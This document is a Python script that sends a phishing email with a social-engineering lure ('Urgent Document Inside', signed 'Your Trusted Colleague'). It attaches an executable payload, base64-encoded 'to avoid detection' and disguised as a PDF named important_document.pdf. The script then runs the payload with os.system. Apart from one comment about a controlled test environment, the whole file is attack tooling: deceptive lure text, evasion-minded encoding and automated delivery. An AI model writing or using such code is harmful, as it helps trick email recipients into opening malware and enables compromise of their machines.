import smtplib
import email.mime.text
import email.mime.multipart
import email.mime.application
import base64
import time
import os
import random

# Set the sender and recipient email addresses
sender = 'example_sender@gmail.com'
recipient = 'example_recipient@gmail.com'

# Create the email message
msg = email.mime.multipart.MIMEMultipart()
msg['From'] = sender
msg['To'] = recipient
msg['Subject'] = 'Action Required: Urgent Document Inside'

# Create the message body
body = email.mime.text.MIMEText('Hello,\n\nPlease review the attached document at your earliest convenience. It contains important information regarding our recent discussion.\n\nBest regards,\nYour Trusted Colleague')
msg.attach(body)

# Add random delay to simulate a more realistic email sending time
time.sleep(random.uniform(1, 5))

# Attach the malicious payload with encoding to avoid detection
filename = 'important_document.pdf'
payload_path = '/path/to/malicious_payload.exe'

# Encode the payload to avoid detection
with open(payload_path, 'rb') as f:
    payload_data = f.read()
    encoded_payload = base64.b64encode(payload_data).decode('utf-8')

# Construct a fake PDF file that contains the encoded payload
fake_pdf_content = f"%PDF-1.4\n1 0 obj\n<</Title (Important Document) /Author (Trusted Source)>>\nendobj\n2 0 obj\n<</Length {len(encoded_payload)}>>\nstream\n{encoded_payload}\nendstream\nendobj\ntrailer\n<</Root 1 0 R>>\n%%EOF"
fake_pdf_filename = 'important_document.pdf'

with open(fake_pdf_filename, 'w') as f:
    f.write(fake_pdf_content)

# Attach the fake PDF file with embedded payload
with open(fake_pdf_filename, 'rb') as f:
    pdf_payload = email.mime.application.MIMEApplication(f.read(), _subtype='pdf')
    pdf_payload.add_header('Content-Disposition', 'attachment', filename=fake_pdf_filename)
    msg.attach(pdf_payload)

# Simulate random server delay
time.sleep(random.uniform(3, 10))

# Send the email with SMTP server
try:
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, 'example_password')
    server.sendmail(sender, recipient, msg.as_string())
    server.quit()
    print('Email sent successfully!')
except Exception as e:
    print(f"Error sending email: {e}")

# Simulate execution of the malicious payload (in a controlled, safe environment for testing)
try:
    print('Attempting to execute the payload...')
    os.system(payload_path)  # In a real attack, this would execute the malware
except Exception as e:
    print(f"Error executing the payload: {e}")
